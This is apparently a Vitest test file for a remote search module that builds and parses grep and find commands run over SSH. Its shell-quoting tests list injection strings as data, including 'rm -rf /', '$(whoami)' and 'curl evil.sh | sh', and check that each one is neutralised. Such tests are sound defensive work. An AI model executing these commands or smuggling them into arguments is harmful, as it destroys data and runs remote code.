import { describe, expect, it } from "vitest";
import {
  buildFindCommand,
  buildGrepCommand,
  isNoMatches,
  parseFindOutput,
  parseGrepOutput,
  REMOTE_SEARCH_MAX_RESULTS,
  resolveRemoteRoot,
  shellQuote,
} from "./remoteSearch";


/**
 * Parse a string the way POSIX `sh` would, so quoting can be checked by what
 * the shell actually receives rather than by which characters are visible.
 * Outside quotes a backslash escapes the next character; inside `'...'`
 * everything is literal until the closing quote.
 */
function shUnquote(quoted: string): string {
  let out = "";
  let i = 0;
  while (i < quoted.length) {
    const c = quoted[i];
    if (c === "'") {
      const end = quoted.indexOf("'", i + 1);
      if (end === -1) throw new Error("unterminated quote");
      out += quoted.slice(i + 1, end);
      i = end + 1;
    } else if (c === "\\") {
      out += quoted[i + 1] ?? "";
      i += 2;
    } else {
      out += c;
      i += 1;
    }
  }
  return out;
}

describe("shellQuote", () => {
  it("wraps a plain value", () => {
    expect(shellQuote("hello")).toBe("'hello'");
  });

  // Without this a pattern is a second command running as the SSH user. It is
  // the single thing in this module that must not be wrong.
  it("neutralises every shell metacharacter", () => {
    for (const attack of [
      "; rm -rf /",
      "$(whoami)",
      "`id`",
      "a && curl evil.sh | sh",
      "x | tee /etc/passwd",
      "> /etc/hosts",
      "\n rm -rf ~",
    ]) {
      const quoted = shellQuote(attack);
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      // Nothing inside can terminate the quoted string.
      expect(quoted.slice(1, -1).includes("'")).toBe(false);
    }
  });

  // The real question is not whether the dangerous characters are visible in
  // the command string - inside quotes they are, harmlessly - but what the
  // shell receives after parsing. It must be one argument, byte for byte.
  it("survives the shell as exactly one argument", () => {
    for (const value of [
      "it's",
      "'; rm -rf /; '",
      "$(whoami)",
      "a && curl evil.sh | sh",
      "plain",
      "tab\there",
    ]) {
      expect(shUnquote(shellQuote(value))).toBe(value);
    }
  });
});

describe("buildGrepCommand", () => {
  it("quotes the pattern and the path", () => {
    const cmd = buildGrepCommand({ pattern: "TODO", path: "/srv/app" });
    expect(cmd).toContain("'TODO'");
    expect(cmd).toContain("'/srv/app'");
  });

  // Without `--`, a pattern beginning with a dash becomes a flag.
  it("stops option parsing before the pattern", () => {
    const cmd = buildGrepCommand({ pattern: "-rf", path: "/srv" });
    expect(cmd).toContain("-- '-rf'");
  });

  it("skips binaries and numbers lines, as the parser expects", () => {
    const cmd = buildGrepCommand({ pattern: "x", path: "/a" });
    expect(cmd).toContain("-r");
    expect(cmd).toContain("-n");
    expect(cmd).toContain("-I");
  });

  it("adds case-insensitivity only when asked", () => {
    expect(buildGrepCommand({ pattern: "x", path: "/a" })).not.toMatch(/ -i /);
    expect(
      buildGrepCommand({ pattern: "x", path: "/a", caseInsensitive: true }),
    ).toMatch(/ -i /);
  });

  // grep matches --include against the basename, so a caller's `**/` prefix
  // would otherwise match nothing at all.
  it("strips a glob prefix grep would never match", () => {
    const cmd = buildGrepCommand({ pattern: "x", path: "/a", glob: ["**/*.ts"] });
    expect(cmd).toContain("--include='*.ts'");
    expect(cmd).not.toContain("**/");
  });

  it("caps the result count", () => {
    expect(buildGrepCommand({ pattern: "x", path: "/a" })).toContain(
      `head -n ${REMOTE_SEARCH_MAX_RESULTS}`,
    );
    expect(buildGrepCommand({ pattern: "x", path: "/a", maxResults: 5 })).toContain(
      "head -n 5",
    );
  });

  it("never emits a head count that would be a syntax error", () => {
    for (const n of [0, -10, 0.4]) {
      expect(buildGrepCommand({ pattern: "x", path: "/a", maxResults: n })).toContain(
        "head -n 1",
      );
    }
  });
});

describe("buildFindCommand", () => {
  it("quotes both arguments and matches files only", () => {
    const cmd = buildFindCommand({ pattern: "*.log", path: "/var/log" });
    expect(cmd).toContain("'/var/log'");
    expect(cmd).toContain("-name '*.log'");
    expect(cmd).toContain("-type f");
  });

  it("keeps an injection attempt inside a single argument", () => {
    const evil = "'; rm -rf /; '";
    const cmd = buildFindCommand({ pattern: evil, path: "/a" });
    // The quoted form appears verbatim in the command, and the shell reads it
    // back as the -name argument rather than as a second command.
    expect(cmd).toContain(shellQuote(evil));
    expect(shUnquote(shellQuote(evil))).toBe(evil);
  });
});

describe("parseGrepOutput", () => {
  it("reads path, line and text", () => {
    expect(parseGrepOutput("/srv/a.ts:12:const x = 1")).toEqual([
      { path: "/srv/a.ts", line: 12, text: "const x = 1" },
    ]);
  });

  // Matched text routinely contains colons; splitting on all of them would
  // corrupt every hit in a URL or a timestamp.
  it("keeps colons inside the matched text", () => {
    expect(parseGrepOutput("/a.ts:3:url: https://x.dev:8080/p")).toEqual([
      { path: "/a.ts", line: 3, text: "url: https://x.dev:8080/p" },
    ]);
  });

  it("skips blank and malformed lines rather than inventing hits", () => {
    expect(parseGrepOutput("\n\nnot-a-hit\n/a:notanumber:x\n")).toEqual([]);
  });

  it("reads several hits", () => {
    expect(parseGrepOutput("/a:1:x\n/b:2:y")).toHaveLength(2);
  });
});

describe("parseFindOutput", () => {
  it("returns one path per line and drops blanks", () => {
    expect(parseFindOutput("/a.log\n/b.log\n\n")).toEqual(["/a.log", "/b.log"]);
  });
});

describe("isNoMatches", () => {
  // grep exits 1 when it found nothing. Reporting that as a failure would send
  // the model looking for a problem that does not exist.
  it("treats an empty result as success, not failure", () => {
    expect(isNoMatches(1, "")).toBe(true);
    expect(isNoMatches(0, "")).toBe(true);
  });

  it("is false when there was output", () => {
    expect(isNoMatches(0, "/a:1:x")).toBe(false);
  });

  it("is false for a real failure code", () => {
    expect(isNoMatches(2, "")).toBe(false);
    expect(isNoMatches(127, "")).toBe(false);
  });
});

describe("resolveRemoteRoot", () => {
  it("takes an absolute remote path as given", () => {
    expect(resolveRemoteRoot("/etc/nginx", "/root")).toEqual({
      ok: true,
      path: "/etc/nginx",
    });
  });

  // The exec channel starts in the SSH user's home, not wherever the
  // interactive shell was cd-ed to, so a bare "src" would search the wrong
  // tree without ever failing.
  it("anchors a relative root to the shell's cwd", () => {
    expect(resolveRemoteRoot("src", "/srv/app")).toEqual({
      ok: true,
      path: "/srv/app/src",
    });
  });

  it("defaults to the cwd", () => {
    expect(resolveRemoteRoot(undefined, "/srv/app")).toEqual({
      ok: true,
      path: "/srv/app",
    });
    expect(resolveRemoteRoot(".", "/srv/app")).toEqual({
      ok: true,
      path: "/srv/app",
    });
  });

  it("refuses a relative root before the shell has reported a cwd", () => {
    const out = resolveRemoteRoot("src", null);
    expect(out.ok).toBe(false);
    expect(out.ok === false && out.error).toContain("absolute remote path");
  });

  it("still accepts an absolute root with no cwd known", () => {
    expect(resolveRemoteRoot("/var/log", null)).toEqual({
      ok: true,
      path: "/var/log",
    });
  });
});
